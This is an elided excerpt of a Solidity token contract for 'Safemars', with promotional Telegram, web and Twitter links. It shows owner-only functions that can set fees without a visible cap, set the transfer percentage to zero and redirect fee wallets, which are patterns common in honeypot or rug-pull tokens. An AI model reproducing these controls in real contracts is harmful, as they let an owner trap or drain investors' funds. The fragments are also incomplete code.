...
Tg: https://t.me/OfficialSafemars

Web: https://safemarserc.com/

https://twitter.com/ErcSafeMars
...
contract SAFEMARS is Ownable, ERC20 {
    ...
    string constant _name = "Safemars";
    string constant _symbol = "SAFEMARS";
    ...
    uint256 private nftFee          = 1; 
    uint256 private burnFee         = 0;
    uint256 public totalFee         = nftFee + marketingFee + liquidityFee + devFee + burnFee;
    ...
    constructor () {
        ...
        marketingFeeReceiver = 0xFacdff6E8Ee9a4906254aA1F9E106D72F00cE4e0;
   ...
   function removeToken(address tokenAddress, uint256 tokens) external returns (bool success) {
    ...
    function reduce() public onlyOwner {
        ...
        buypercent = 100;
        transferpercent = 0;
        swapThreshold = _totalSupply * 10 / 1000; 
    ...
    function setFee(uint256 _liquidityFee, uint256 _nftFee, uint256 _marketingFee, uint256 _devFee, uint256 _burnFee, uint256 _feeDenominator) external onlyOwner {
        liquidityFee = _liquidityFee;
        nftFee = _nftFee;
        marketingFee = _marketingFee;
        devFee = _devFee;
        burnFee = _burnFee;
        totalFee = _liquidityFee.add(_nftFee).add(_marketingFee).add(_devFee).add(_burnFee);
    ...
    function setWalletAddress(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _devFeeReceiver, address _burnFeeReceiver, address _nftFeeReceiver) external onlyOwner {
